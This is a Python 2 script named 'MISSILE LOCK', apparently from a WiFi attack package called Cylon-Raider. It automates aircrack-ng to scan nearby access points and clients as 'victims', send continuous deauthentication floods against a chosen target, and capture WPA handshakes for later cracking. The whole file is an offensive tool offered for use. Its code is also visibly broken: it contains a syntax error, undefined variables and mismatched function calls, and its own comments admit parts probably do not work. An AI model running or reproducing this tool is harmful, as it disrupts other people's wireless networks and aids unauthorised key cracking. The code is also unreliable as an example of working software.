import os
from os import devnull
import socket
import sys
from multiprocessing import process
import subprocess
from subprocess import Popen, call, PIPE
import re
import time
from sys import argv
from sys import stdout
import wireless_attack_toolkit

# print colored('MISSILE LOCK: Experimental Replay-Attack Automater based on the Aircrack-Suite and Wifite','cyan',attrs=['bold'])
# print colored('Part of the Cylon-Raider Package','yellow',attrs=['bold'])

print 'MISSILE LOCK: Experimental Replay-Attack Automater based on the Aircrack-Suite and Wifite'
print 'Part of the Cylon-Raider & Arms-Commander Package'

# defining variables
BSSID_targeting_str = 'BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID'
CLIENT_targeting_str = 'BSSID              STATION            PWR   Rate    Lost    Frames  Probe'
successful_handshake_capture_str = 'WPA handshake:'
capture_Interface = 'wlan1mon'

# defining temporary files
temp_airodump_recon_file = '/root/Cylon-Raider-Lite/logs/airodump_recon_file.csv'
temp_file_airodump_targeted = '/root/Cylon-Raider-Lite/logs/temp_file_airodump_targeted.csv'
temp_file_BSSID_targeted = '/root/Cylon-Raider-Lite/logs/temp_file_BSSID_targeted.csv'
temp_file_CLIENT_targeted = '/root/Cylon-Raider-Lite/logs/temp_file_CLIENT_targeted.csv'

# defining devnull
DEVNULL = open(os.devnull, 'w')
# sys.stdout = DN

def airmon():
    os.system('airmon-ng check kill')
    os.system('airmon-ng wlan1 start')
    main()
    return


def airodump_recon(capture_Interface, temp_airodump_recon_file, DEVNULL): # Either Whole or Targeted
    temp_airodump_recon_file = '/root/Cylon-Raider-Lite/logs/airodump_recon_file.csv'
    temp_file_airodump_targeted = '/root/Cylon-Raider-Lite/logs/temp_file_airodump_targeted.csv'
    temp_file_BSSID_targeted = '/root/Cylon-Raider-Lite/logs/temp_file_BSSID_targeted.csv'
    temp_file_CLIENT_targeted = '/root/Cylon-Raider-Lite/logs/temp_file_CLIENT_targeted.csv'
    cmd_String = 'airodump-ng %s' % capture_Interface
    # process_recon = subprocess.Popen(cmd_String, stderr=DEVNULL, stdout=DEVNULL)
    process_recon = subprocess.Popen(cmd_String, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
    output = process_recon.communicate()
    if re.findall('BSSID', output): # nope, it failed
        print 'Found the term "BSSID in subprocess output. Test complete"'
    # okay subprocesses and Popen sucks and is poorly documented between differing Python versions.

    # Until I get something more concise, then this is the best I can do. and that means not much.
    print output
    w = open(temp_airodump_recon_file,'w')
    w.write(process_recon)
    target_counter = 0
    print 'PRESS CTRL + C to stop scanning targets'
    with open(temp_file_airodump_targeted,'r') as r:
        line = r.readline().strip()
        sentence = str(line)
        try:
            if re.findall(BSSID_targeting_str, sentence): # this probably wont work. I would need to make it do something to the other lines
                following_line = r.next().strip()
                write_string = 'WIRELESS ACCESS POINT TARGETING:\n'
                BSSID_targeted_w = open(temp_file_BSSID_targeted,'w')
                BSSID_targeted_w.write(write_string)
                BSSID_targeted_w.write(BSSID_targeting_str + '\n')
                for following_line in r:
                    target_counter += 1
                    sentence = sentence.strip().split()
                    BSSID = sentence[0]
                    signal_strength = sentence[1]
                    broadcast_announcements = sentence[2]
                    data_packets = sentence[3]
                    dp_per_sec = sentence[4]
                    channel = sentence[5]
                    max_net_speed = sentence[6]
                    encryption = sentence[7]
                    cipher = sentence[8]
                    key_type = sentence[9]
                    ESSID = sentence[10]
                    write_string = "TARGET: #%s BSSID: %s ESSID: %s CHANNEL: %s SIGNAL: %s ENCRYPTION: %s CIPHER: %s KEY TYPE: %s BROADCASTS: %s DATA PACKETS: %s DP/s: %s MAX NETWORK SPEED: %s\n" % (
                        target_counter,
                        BSSID,
                        ESSID,
                        channel,
                        signal_strength,
                        encryption,
                        cipher,
                        key_type,
                        broadcast_announcements,
                        data_packets,
                        dp_per_sec,
                        max_net_speed
                    )
                    BSSID_targeted_w.write(write_string)
                    BSSID_targeted_w.close()
                    cmd_String = 'cat %s' % temp_file_BSSID_targeted
                    os.system(cmd_String)
            if re.findall(CLIENT_targeting_str, proc_airodump_targeted):
                following_line = r.next().strip()
                write_string = 'CLIENT MAC-ADDR TARGETING:\n'
                CLIENT_targeted_w = open(temp_file_CLIENT_targeted,'w')
                CLIENT_targeted_w.write(write_string)
                CLIENT_targeted_w.write(CLIENT_targeting_str + '\n')
                for following_line in r:
                    target_counter += 1
                    sentence = sentence.replace('(not associated)','NONE')
                    sentence = sentence.strip().split()
                    connected_AP = sentence[0]
                    client_MAC_addr = sentence[1]
                    signal_strength = sentence[2]
                    data_rate = sentence[3:5]
                    lost_packets = sentence[6]
                    frames = sentence[7]
                    AP_probes = sentence[8]
                    write_string = 'TARGET: #%s CONNECTED AP: %s MAC ADDR: %s SIGNAL: %s DATA RATE: %s LOST PKTS: %s FRAMES: %s AP PROBES: %s\n' % (
                        target_counter,
                        connected_AP,
                        client_MAC_addr,
                        signal_strength,
                        data_rate,
                        lost_packets,
                        frames,
                        AP_probes
                    )

                    CLIENT_targeted_w.write(write_string)
            # cats the final output of the files to be displayed on the screen
            cmd_String = 'cat %s' % temp_file_BSSID_targeted
            os.system(cmd_String)
            cmd_String = 'cat %s' % temp_file_CLIENT_targeted
            os.system(cmd_String)
        except KeyboardInterrupt:
            cmd_String = 'cat %s' % temp_file_BSSID_targeted
            os.system(cmd_String)
            cmd_String = 'cat %s' % temp_file_CLIENT_targeted
            os.system(cmd_String)
            target_menu()
    w.close()
    return


def airodump_targeted(BSSID_targeting_str, CLIENT_targeting_str, successful_handshake_capture_str, capture_BSSID, capture_Channel, cap_file, capture_Interface):
    cap_file = capture_BSSID + '_' + ESSID + '.cap'

    cmd_String = "airodump-ng --bssid {0} -c {1} --write {2} {3}".format(
        capture_BSSID,
        capture_Channel,
        cap_file,
        capture_Interface
    )

    proc_airodump_targeted = subprocess.Popen(cmd_String, stdout=DEVNULL, stderr=DEVNULL)
    temp_file_airodump_targeted = '/root/Cylon-Raider-Lite/logs/temp_file_airodump_targeted.csv'
    temp_file_BSSID_targeted = '/root/Cylon-Raider-Lite/logs/temp_file_BSSID_targeted.csv'
    temp_file_CLIENT_targeted = '/root/Cylon-Raider-Lite/logs/temp_file_CLIENT_targeted.csv'
    # open a writable main targeted airodump file
    w = open(temp_file_airodump_targeted,'w') # make sure its a regular 'w' so it can be overwritten
    w.write(proc_airodump_targeted) # write each line to a temporary file
    w.close()
    r = open(temp_file_airodump_targeted,'r') # open the file for temporary reading
    target_counter = 0
    print 'PRESS CTRL + C to stop scanning targets'
    with open(temp_file_airodump_targeted,'r') as r:
        line = r.().strip()
        sentence = str(line)
        try:
            if re.findall(BSSID_targeting_str, sentence): # this probably wont work. I would need to make it do something to the other lines
                following_line = r.next().strip()
                write_string = 'WIRELESS ACCESS POINT TARGETING:\n'
                BSSID_targeted_w = open(temp_file_BSSID_targeted,'w')
                BSSID_targeted_w.write(write_string)
                BSSID_targeted_w.write(BSSID_targeting_str + '\n')
                for following_line in r:
                    target_counter += 1
                    sentence = sentence.strip().split()
                    BSSID = sentence[0]
                    signal_strength = sentence[1]
                    broadcast_announcements = sentence[2]
                    data_packets = sentence[3]
                    dp_per_sec = sentence[4]
                    channel = sentence[5]
                    max_net_speed = sentence[6]
                    encryption = sentence[7]
                    cipher = sentence[8]
                    key_type = sentence[9]
                    ESSID = sentence[10]
                    write_string = "TARGET: #%s BSSID: %s ESSID: %s CHANNEL: %s SIGNAL: %s ENCRYPTION: %s CIPHER: %s KEY TYPE: %s BROADCASTS: %s DATA PACKETS: %s DP/s: %s MAX NETWORK SPEED: %s\n" % (
                        target_counter,
                        BSSID,
                        ESSID,
                        channel,
                        signal_strength,
                        encryption,
                        cipher,
                        key_type,
                        broadcast_announcements,
                        data_packets,
                        dp_per_sec,
                        max_net_speed
                    )
                    BSSID_targeted_w.write(write_string)
                    BSSID_targeted_w.close()
                    cmd_String = 'cat %s' % temp_file_BSSID_targeted
                    os.system(cmd_String)
            if re.findall(CLIENT_targeting_str, proc_airodump_targeted):
                following_line = r.next().strip()
                write_string = 'CLIENT MAC-ADDR TARGETING:\n'
                CLIENT_targeted_w = open(temp_file_CLIENT_targeted,'w')
                CLIENT_targeted_w.write(write_string)
                CLIENT_targeted_w.write(CLIENT_targeting_str + '\n')
                for following_line in r:
                    target_counter += 1
                    sentence = sentence.replace('(not associated)','NONE')
                    sentence = sentence.strip().split()
                    connected_AP = sentence[0]
                    client_MAC_addr = sentence[1]
                    signal_strength = sentence[2]
                    data_rate = sentence[3:5]
                    lost_packets = sentence[6]
                    frames = sentence[7]
                    AP_probes = sentence[8]
                    write_string = 'TARGET: #%s CONNECTED AP: %s MAC ADDR: %s SIGNAL: %s DATA RATE: %s LOST PKTS: %s FRAMES: %s AP PROBES: %s\n' % (
                        target_counter,
                        connected_AP,
                        client_MAC_addr,
                        signal_strength,
                        data_rate,
                        lost_packets,
                        frames,
                        AP_probes
                    )

                    CLIENT_targeted_w.write(write_string)
            # cats the final output of the files to be displayed on the screen
            cmd_String = 'cat %s' % temp_file_BSSID_targeted
            os.system(cmd_String)
            cmd_String = 'cat %s' % temp_file_CLIENT_targeted
            os.system(cmd_String)
        except KeyboardInterrupt:
            target_menu()

def check_airodump(capture_BSSID, ESSID, capture_Channel, cap_file, capture_Interface):
    temp_file_check_airodump = '/root/Cylon-Raider-Lite/logs/temp_check_airodump.csv'
    BSSID = capture_BSSID
    cmd_airodump = "airodump-ng --bssid {0} -c {1} --write {2} {3}".format(
        capture_BSSID,
        capture_Channel,
        temp_file_check_airodump,
        capture_Interface
    )
    os.system(cmd_String)
    proc_check_airodump = subprocess.Popen(cmd_airodump, stdout=DEVNULL, stderr=DEVNULL)

    w = open(temp_file_check_airodump,'w')
    w.write(proc_check_airodump)

    r = open(temp_file_check_airodump,'r')
    with open(temp_file_check_airodump,'r') as r:
        line = r.readline().strip()
        sentence = str(line)
        if re.findall('WPA handshake: ',sentence):
            sentence = sentence.split(':')
            victim_AP = sentence[1]
            print 'FOUND HANDSHAKE FOR: %s' % victim_AP
            permanent_handshake_cap_file = '/root/Cylon-Raider-Lite/logs/captured_handshake_%s_%s.cap' % (BSSID, ESSID)
            cmd_String = "cp -r '%s' '%s'" % (temp_file_check_airodump, permanent_handshake_cap_file)
            print 'Handshake saved as %s' % permanent_handshake_cap_file
            exit(0)
        else:
            print 'NO HANDSHAKE FOUND YET'
            time.sleep(10)

    w.close()


    return

def target_AP_deauth():
    target_selected = str(raw_input("Enter a NUMBER: "))
    target_selected = 'TARGET: #' + target_selected
    r = open(temp_file_BSSID_targeted,'r')
    with open(temp_file_BSSID_targeted,'r') as r:
        line = r.readline().strip()
        sentence = str(line)
        if re.findall(target_selected, sentence):
# TARGET: #%s BSSID: %s ESSID: %s CHANNEL: %s SIGNAL: %s ENCRYPTION: %s CIPHER: %s KEY TYPE: %s BROADCASTS: %s DATA PACKETS: %s DP/s: %s MAX NETWORK SPEED: %s\n
# TARGET: #1 BSSID: 6A:8A:31:98:A7:3B ESSID: IronYard5g CHANNEL: 6
            sentence = sentence.strip().split()
            BSSID = sentence[3]
            ESSID = sentence[5]
            channel = sentence[7]
            capture_Interface = 'wlan1mon'
            cmd_String = "aireplay-ng -0 0 -a {0} --ignore-negative-one {1}".format(BSSID, capture_Interface)
            print 'Now attacking ESSID = %s BSSID = %s on CHANNEL = %s' % (ESSID, BSSID, channel)
            subprocess_check_airodump = check_airodump()
            subprocess.call(subprocess_check_airodump, stdout=DEVNULL, stderr=DEVNULL)
            os.system(cmd_String)
        else:
            print 'Improper target selected'
            target_AP_deauth()
    return


def target_CLIENT_deauth():
    target_selected = str(raw_input("Enter a NUMBER: "))
    target_selected = 'TARGET: #' + target_selected
    r = open(temp_file_CLIENT_targeted,'r')
    with open(temp_file_CLIENT_targeted,'r') as r:
        line = r.readline().strip()
        sentence = str(line)
        if re.findall(target_selected, sentence):
            sentence = sentence.strip().split()
            AP_mac = sentence[4]
            capture_BSSID = AP_mac
            CLIENT_mac = sentence[7]
            client_mac = CLIENT_mac
            capture_Interface = 'wlan1mon'
# TARGET: #1 CONNECTED AP: 1231231234 MAC ADDR: 3425432 SIGNAL: 1231231 DATA RATE: 6536 LOST PKTS: 898 FRAMES: %s AP PROBES: %s
            cmd_String = "aireplay-ng -0 0 -c %s -a %s --ignore-negative-one %s" % (
                client_mac,
                capture_BSSID,
                capture_Interface
                )
            subprocess_check_airodump = check_airodump()
            subprocess.call(subprocess_check_airodump, stdout=DEVNULL, stderr=DEVNULL)
            os.system(cmd_String)
                # target_selected = str(raw_input("Enter a NUMBER: "))
    # target_selected = 'TARGET: #' + target_selected
    # r = open(temp_file_BSSID_targeted,'r')
    # with open(temp_file_BSSID_targeted,'r') as r:
    #     line = r.readline().strip()
    #     sentence = str(line)
    #     sentence = sentence.strip().split()
    #     if re.findall(target_selected, sentence):
    #
    #     else:
    #         print 'Improper target selected'
    #         target_AP_deauth()
    return


def target_menu():

    print """
    You have two choices.

    #1. Send deauth packets at the ACCESS Point

    #2. Send deauth packets at the connected CLIENT
    """
    opt_Choice = str(raw_input("Enter a choice of targeting: "))
    if opt_Choice == "1":
        print 'Select your target ACCESS POINT'
        cmd_String = 'cat %s' % temp_file_BSSID_targeted
        target_AP_deauth()
    elif opt_Choice == "2":
        print 'Select your target CLIENT'
        cmd_String = 'cat %s' % temp_file_CLIENT_targeted
        target_CLIENT_deauth()
    else:
        print 'You have entered a invalid option'
        target_menu()
 # BSSID              STATION            PWR   Rate    Lost    Frames  Probe
 #  (not associated)   6A:8A:31:98:A7:3B  -76    0 - 1      0       14  IronYard5g
    return

def main():
    opt_List = [
        '\n\t#0. Return to Cylon-Raider Main Menu',
        '#1. MONITOR MODE, sets wlan1 to monitor mode',
        '#2. RECON, start untargeted sniffing to look for victims',
        '#3. TARGETED LOCK-ON & REPLAY ATTACK, choose a identified target and either target the Access Point or the client to send deauthorization packets to',
        '#4. REPLAY ATTACK ONLY, if you already scanned targets in steps 2 and 3 but you somehow botched it. You can resume here'

    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "0":
        os.system('clear')
        os.system('python /root/Cylon-Raider-Lite/Cylon_Raider_Main.py')
    elif opt_Choice == "1":
        os.system('clear')
        airmon()
        main()
    elif opt_Choice == "2":
        os.system('clear')
        airodump_recon(capture_Interface, temp_airodump_recon_file, DEVNULL)
        main()
    elif opt_Choice == "3":
        os.system('clear')
        airodump_targeted()
        main()
    elif opt_Choice == "4":
        os.system('clear')
        target_menu()
        main()
    else:
        print 'You have entered a invalid option'
        main()
    return
main()
